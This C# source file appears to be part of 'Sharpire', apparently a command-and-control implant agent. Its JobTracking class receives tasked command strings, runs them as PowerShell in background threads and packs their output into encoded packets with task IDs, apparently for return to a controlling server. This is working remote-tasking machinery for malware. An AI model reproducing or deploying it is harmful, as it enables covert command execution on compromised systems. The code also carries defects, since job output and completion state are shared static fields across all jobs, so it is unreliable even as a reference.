using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;
using System.Threading;

namespace Sharpire
{
    ////////////////////////////////////////////////////////////////////////////////
    public class JobTracking
    {
        public Dictionary<String, Job> jobs;
        public Dictionary<String, UInt16> jobsId;
        public Byte[] ImportedScript { get; set; }

        ////////////////////////////////////////////////////////////////////////////////
        public JobTracking()
        {
            jobs = new Dictionary<String, Job>();
            jobsId = new Dictionary<String, UInt16>();
        }

        ////////////////////////////////////////////////////////////////////////////////
        internal void CheckAgentJobs(ref Byte[] packets, ref Coms coms)
        {
            Console.WriteLine("checkAgentJobs");
            lock (jobs)
            {
                List<String> jobsToRemove = new List<String>();
                foreach (KeyValuePair<string, Job> job in jobs)
                {
                    String results = "";
                    if (job.Value.IsCompleted())
                    {
                        try
                        {
                            results = job.Value.GetOutput();
                            job.Value.KillThread();
                        }
                        catch (NullReferenceException) { }

                        jobsToRemove.Add(job.Key);
                        packets = Misc.combine(packets, coms.encodePacket(110, results, jobsId[job.Key]));
                    }
                }
                jobsToRemove.ForEach(x => jobs.Remove(x));
                lock (jobsId)
                {
                    jobsToRemove.ForEach(x => jobsId.Remove(x));
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal Byte[] GetAgentJobsOutput(ref Coms coms)
        {
            Byte[] jobResults = new Byte[0];
            Console.WriteLine("getAgentJobsOutput");
            lock (jobs)
            {
                List<String> jobsToRemove = new List<String>();
                foreach (String jobName in jobs.Keys)
                {
                    Console.WriteLine(jobName);
                    String results = "";
                    if (jobs[jobName].IsCompleted())
                    {
                        try
                        {
                            results = jobs[jobName].GetOutput();
                            Console.WriteLine(results);
                            jobs[jobName].KillThread();
                        }
                        catch (NullReferenceException ex) { Console.WriteLine(ex); }
                        jobsToRemove.Add(jobName);
                    }
                    else
                    {
                        results = jobs[jobName].GetOutput();
                    }

                    if (0 < results.Length)
                    {
                        jobResults = Misc.combine(jobResults, coms.encodePacket(110, results, jobsId[jobName]));
                    }
                }
                jobsToRemove.ForEach(x => jobs.Remove(x));
                lock (jobsId)
                {
                    jobsToRemove.ForEach(x => jobsId.Remove(x));
                }
            }
            return jobResults;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal String StartAgentJob(String command, UInt16 taskId)
        {
            Random random = new Random();
            String characters = "ABCDEFGHKLMNPRSTUVWXYZ123456789";
            Char[] charactersArray = characters.ToCharArray();
            StringBuilder sb = new StringBuilder(8);
            for (Int32 i = 0; i < 8; i++)
            {
                Int32 j = random.Next(charactersArray.Length);
                sb.Append(charactersArray[j]);
            }

            String id = sb.ToString();
            lock (jobs)
            {
                jobs.Add(id, new Job(command));
            }
            lock (jobsId)
            {
                jobsId.Add(id, taskId);
            }
            return id;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public class Job
        {
            private Thread JobThread { get; set; }
            private static String output = "";
            private static Boolean isFinished = false;

            ////////////////////////////////////////////////////////////////////////////////
            ////////////////////////////////////////////////////////////////////////////////
            public Job(String command)
            {
                JobThread = new Thread(() => RunPowerShell(command));
                JobThread.Start();
            }

            ////////////////////////////////////////////////////////////////////////////////
            ////////////////////////////////////////////////////////////////////////////////
            public static void RunPowerShell(String command)
            {
                using (Runspace runspace = RunspaceFactory.CreateRunspace())
                {
                    runspace.Open();

                    using (Pipeline pipeline = runspace.CreatePipeline())
                    {
                        pipeline.Commands.AddScript(command);
                        pipeline.Commands.Add("Out-String");

                        StringBuilder sb = new StringBuilder();
                        try
                        {
                            Collection<PSObject> results = pipeline.Invoke();
                            foreach (PSObject obj in results)
                            {
                                sb.Append(obj.ToString());
                            }
                        }
                        catch (ParameterBindingException error)
                        {
                            sb.Append("[-] ParameterBindingException: " + error.Message);
                        }
                        catch (CmdletInvocationException error)
                        {
                            sb.Append("[-] CmdletInvocationException: " + error.Message);
                        }
                        catch (RuntimeException error)
                        {
                            sb.Append("[-] RuntimeException: " + error.Message);
                        }
                        finally
                        {
                            lock (output)
                            {
                                output = sb.ToString();
                            }
                            isFinished = true;
                        }
                    }
                }
            }

            ////////////////////////////////////////////////////////////////////////////////
            ////////////////////////////////////////////////////////////////////////////////
            public Boolean IsCompleted()
            {
                if (null != JobThread)
                {
                    if (true == isFinished)
                    {
                        Console.WriteLine("Finished");
                        return true;
                    }
                    Console.WriteLine("Not Finished");
                    return false;
                }
                else
                {
                    return true;
                }
            }

            ////////////////////////////////////////////////////////////////////////////////
            ////////////////////////////////////////////////////////////////////////////////
            public String GetOutput()
            {
                return output;
            }

            ////////////////////////////////////////////////////////////////////////////////
            ////////////////////////////////////////////////////////////////////////////////
            public void KillThread()
            {
                JobThread.Abort();
            }
        }
    }
}